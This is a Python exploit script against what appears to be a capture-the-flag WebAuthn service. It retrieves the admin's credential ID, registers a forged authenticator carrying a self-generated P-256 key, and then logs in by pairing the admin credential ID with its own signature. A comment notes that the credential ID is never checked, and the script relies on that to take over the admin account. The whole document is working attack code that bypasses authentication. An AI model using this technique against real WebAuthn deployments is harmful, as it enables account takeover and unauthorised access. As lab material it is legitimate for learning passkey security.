import requests, json, base64, secrets, cbor2, hashlib, struct
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes


ORIGIN = "https://webauthn3.youcanhack.me"
DOMAIN = "webauthn3.youcanhack.me"


### GET ADMIN CREDENTIAL ID ###
opts = requests.get(f'{ORIGIN}/api/login?username=admin').json()
admin_id = opts['allowCredentials'][0]['id']
print(f'Using admin credential ID: {admin_id}')


### GET REGISTRATION OPTIONS ###
opts = requests.get(f'{ORIGIN}/api/register').json()



### GENERATE REGISTRATION RESPONSE ###
my_id = secrets.token_urlsafe(32)
print(f'Using my credential ID: {my_id}')

username = opts['user']['name']

private_key = ec.generate_private_key(ec.SECP256R1())
public_key = private_key.public_key()

numbers = public_key.public_numbers()
x = numbers.x.to_bytes(32, "big")
y = numbers.y.to_bytes(32, "big")

rp_id_hash = hashlib.sha256(DOMAIN.encode()).digest()
flags = b'\x45'                                 # user present and user verified
sign_count = struct.pack(">I", 0)               # initial sign count, big-endian uint32
aaguid = secrets.token_bytes(16)                # random AAGUID
cred_id = secrets.token_hex(8).encode()         # admin credential ID
cred_id_len = struct.pack(">H", len(cred_id))   # credential ID length
cose_encoded = cbor2.dumps({
    1: 2,        # kty: EC2
    3: -7,       # alg: ES256
    -1: 1,       # crv: P-256
    -2: x,       # x-coordinate
    -3: y        # y-coordinate
})
auth_data = rp_id_hash + flags + sign_count + aaguid + cred_id_len + cred_id + cose_encoded

registration_obj = {
    'clientExtensionResults': {
        'credProps': {'rk': False}
    },
    'id': base64.urlsafe_b64encode(cred_id).decode().strip('='),
    'rawId': base64.urlsafe_b64encode(cred_id).decode().strip('='),
    'response': {
        'attestationObject': base64.urlsafe_b64encode(cbor2.dumps({
            'fmt': 'none',
            'attStmt': {},
            'authData': auth_data,
        })).decode(),
        'clientDataJSON': base64.urlsafe_b64encode(json.dumps({
            "type":"webauthn.create",
            "challenge": opts['challenge'],
            "origin": ORIGIN,
            "crossOrigin": False
        }).encode()).decode(),
        'transports': ['usb']
    },
    'type': 'public-key'
}


### SEND REGISTRATION RESPONSE ###
response = requests.post(f'{ORIGIN}/api/register', json={'username': username, 'reg': registration_obj})
print(response.text)

if response.status_code != 200:
    print("Registration failed, check the response above.")
    exit()


### GET AUTHENTICATION OPTIONS ###
opts = requests.get(f'{ORIGIN}/api/login?username={username}').json()



### GENERATE AUTHENTICATION RESPONSE ###
flags = b'\x05'
sign_count = struct.pack(">I", 0)  # incremented sign count
auth_data = rp_id_hash + flags + sign_count

authenticatorData = base64.urlsafe_b64encode(auth_data).decode()
clientDataJSON = json.dumps({
    "type": "webauthn.get",
    "challenge": opts['challenge'],
    "origin": ORIGIN,
    "crossOrigin": False
})
auth_obj = {
    'id': admin_id, # this is never checked, but is the index for updating information
    'rawId': admin_id,
    'response': {
        'authenticatorData': authenticatorData,
        'clientDataJSON': base64.urlsafe_b64encode(clientDataJSON.encode()).decode(),
        'signature': base64.urlsafe_b64encode(private_key.sign(
            auth_data + hashlib.sha256(clientDataJSON.encode()).digest(),
            ec.ECDSA(hashes.SHA256())
        )).decode(),
        'userHandle': base64.urlsafe_b64encode(username.encode()).decode()
    },
    'type': 'public-key',
    'authenticatorAttachment': 'cross-platform',
    'clientExtensionResults': {}
}



### SEND AUTHENTICATION RESPONSE ###
response = requests.post(f'{ORIGIN}/api/login', json={'auth': auth_obj})
print(response.text)

if response.status_code != 200:
    print("Authentication failed, check the response above.")
    exit()